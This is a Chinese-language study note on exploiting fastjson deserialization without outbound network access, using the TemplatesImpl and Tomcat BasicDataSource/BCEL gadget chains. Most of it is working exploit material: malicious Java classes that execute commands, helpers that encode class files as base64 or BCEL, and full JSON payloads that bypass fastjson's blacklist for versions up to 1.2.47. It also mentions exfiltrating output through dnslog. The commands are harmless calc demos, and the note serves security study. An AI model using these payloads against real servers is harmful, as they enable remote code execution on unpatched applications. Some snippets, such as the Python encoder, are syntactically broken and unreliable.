# fastjson不出网利用

## 参考链接

https://cloud.tencent.com/developer/article/1785575

https://blog.csdn.net/m0_52367015/article/details/127840178

https://xz.aliyun.com/t/12492?time__1311=GqGxRQq7qeqWqGN4mxUxQuZC17D%3DQTQ4D#toc-2



## 利用方式

目前公开已知的poc有两个：

1. com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
2. org.apache.tomcat.dbcp.dbcp2.BasicDataSource

### 限制

第一种利用方式需要一个特定的触发条件，解析JSON的时候需要使用Feature才能触发

```java
JSONObject.parseObject(sb.toString(), new Feature[]{Feature.SupportNonPublicField});
```

第二种利用方式则需要应用部署在Tomcat应用环境中，因为Tomcat应用环境自带tomcat-dbcp.jar

![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/ikk8psi5h4.png)

对于SpringBoot这种自带Tomcat可以直接以单个jar文件部署的需要在maven中配置tomcat-dbcp。

而且对于不同的Tomcat版本使用的poc也不同：

- Tomcat 8.0以后使用`org.apache.tomcat.dbcp.dbcp2.BasicDataSource`
- Tomcat 8.0以下使用`org.apache.tomcat.dbcp.dbcp.BasicDataSource`

## TemplatesImpl利用连

版本 1.2.24
苛刻条件：

1. 服务端使用parseObject()时，必须使用如下格式才能触发漏洞： JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);
2. 服务端使用parse()时，需要 JSON.parse(text1,Feature.SupportNonPublicField)
   这是因为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl需要赋值的一些属性为private 属性，要满足private属性的数据。所以比较苛刻，完全凭运气。

![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/20230427151006-89a3d2de-e4ca-1.png)

![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/20230427151021-92cc5f5c-e4ca-1.png)

创建恶意类

```java
package com.exmple;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

public class Shell extends AbstractTranslet{
    public static void main(String[] args) {
        try {
            Runtime.getRuntime().exec("open -a calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws
            TransletException {
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator,
                          SerializationHandler handler) throws TransletException {
    }
}
```

base64加密

```java
package com.exmple;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Base64;

public class FiletoBase64 {
    public static String FiletoBase64(String filename) throws IOException {
        File file = new File(filename);
        FileInputStream io = new FileInputStream(file);
        ByteArrayOutputStream os = new ByteArrayOutputStream();
        byte[] buf = new byte[10240];
        int len;
        while ((len = io.read(buf)) > 0) {
            os.write(buf, 0, len);
        }
        io.close();
        String s = Base64.getEncoder().encodeToString(os.toByteArray());
        return s;
    }
}
```

主类

```java
package com.exmple;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;

import java.io.IOException;

public class Demo {
    public static void main(String[] args) {

        String shell = null;
        try {
            shell = FiletoBase64.filetoBase64("/Users/ajie/Desktop/fastjson/target/classes/com/exmple/Shell.class");
        } catch (IOException e) {
            e.printStackTrace();
        }
        String payload1 = " {\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\""+shell+"\"],\"_name\":\"a.b\",\"_tfactory\":{},\"_outputProperties\":{ },\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";
        System.out.println(payload1);
        JSONObject obj = JSON.parseObject(payload1, Feature.SupportNonPublicField);
        System.out.println(obj);
    }
}
```

![img](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/20230427151240-e5a16056-e4ca-1.png)

版本>1.2.24

这里使用的是SpringBoot自带的Tomcat复现的漏洞。由于解析json需要额外添加参数Feature，因此实际情况可能不会遇到，这里只是做个记录。首先需要准备一个Poc：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;​
public class Calc extends AbstractTranslet {
    public Calc() throws IOException {
        Runtime.getRuntime().exec(new String[] {
            "cmd", "/c", "calc"
        });
    }
    @Override 
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {}
    @Override 
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException {}
    public static void main(String[] args) throws Exception {
        Calc t = new Calc();
    }
}
```

通过命令行执行`javac Poc.java`得到class文件，然后通过python脚本得到该文件的base64编码：

```python
import base64
with open(r "Poc.class", "rb") as file: 
	s = base64.b64encode(file.read()) print(s.decode('utf-8'))
```

由于fastjson在1.2.25版本之后增加了黑名单机制，因此网上直接找到的poc并不能直接拿来用，这里基于<=1.2.47版本的缓存类的绕过黑名单的方式修改原有poc：

```json
{
    "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
    },
    "b": {
        "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "_bytecodes": [
            "poc.class_base64"
        ],
        '_name': 'a.b',
        '_tfactory': {
            
        },
        "_outputProperties": {
            
        },
        "_name": "b",
        "_version": "1.0",
        "allowedProtocols": "all"
    }
}
```

## BasicDataSource

利用环境需要实际下载Tomcat应用环境或者在maven中配置如下依赖：

```java
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-dbcp</artifactId>
    <version>9.0.8</version>
</dependency>
```

这里使用的是从Tomcat官网下载的Tomcat8.5.61，需要将springboot打成war包进行部署。

准备的Poc如下：

```java
public class Poc
{
    static
    {
        try
        {
            Runtime.getRuntime().exec(new String[]
            {
                "cmd", "/c", "calc"
            });
        }
        catch(Exception e)
        {}
    }
} 

// 在构造函数中写也可以
public class Poc
{
    public Poc()
    {
        try
        {
            Runtime.getRuntime().exec(new String[]
            {
                "cmd", "/c", "calc"
            });
        }
        catch(Exception e)
        {}
    }
}
```

首先在命令行下运行`javac Poc.java`得到Poc.class ，然后运行下面的java代码得到Poc.class文件的BCEL编码（编码内容保存在res.txt中）。

高版本可能对该函数做了修改，尽量使用环境的java版本。

```java
import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
public class Test
{
    public static void main(String[] args) throws IOException
    {
        Path path = Paths.get("C:\\Users\\Administrator\\Desktop\\Poc.class");
        byte[] bytes = Files.readAllBytes(path);
        System.out.println(bytes.length);
        String result = Utility.encode(bytes, true);
        BufferedWriter bw = new BufferedWriter(new FileWriter("C:\\Users\\Administrator\\Desktop\\res.txt"));
        bw.write("$$BCEL$$" + result);
        bw.close();
    }
}
```

同上由于fastjson在1.2.25版本之后增加了黑名单机制，这里基于<=1.2.47版本的缓存类的绕过黑名单的方式修改原有poc：

```json
{
    "a": {
        "@type": "java.lang.Class",
        "val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "b": {
        "@type": "java.lang.Class",
        "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
    },
    "c": {
        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
        "driverClassLoader": {
            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "driverClassName": "BCELencode"
    }
}
```

## 命令执行回显

常见的回显方式有三种：

1. 一种是直接将命令执行结果写入到静态资源文件里，如html、js等，然后通过http访问就可以直接看到结果。
2. 通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了。
3. 直接将命令执行结果回显到请求Poc的HTTP响应中。

## 后记

版本＞=1.2.36$ref引用可触发get方法也是一种利用方法。

Y4师傅的:[Java安全\]Fastjson＞=1.2.36$ref引用可触发get方法分析_Y4tacker的博客-CSDN博客_fastjson get方法](https://blog.csdn.net/solitudi/article/details/120275526?ops_request_misc=%7B%22request%5Fid%22%3A%22166824314316782425171350%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=166824314316782425171350&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-120275526-null-null.nonecase&utm_term=ref&spm=1018.2226.3001.4450)

第二种通过dnslog.cn和ceye.io也用得比较多了，但是数据量大了之后就不方便外带了。第三种在网上有很多文章

## TODO

没有上手自己调试，等有时间了在学一下怎么在docker中调试代码。感觉应该会方便点，本地自己引包老是奇奇怪怪的错误。









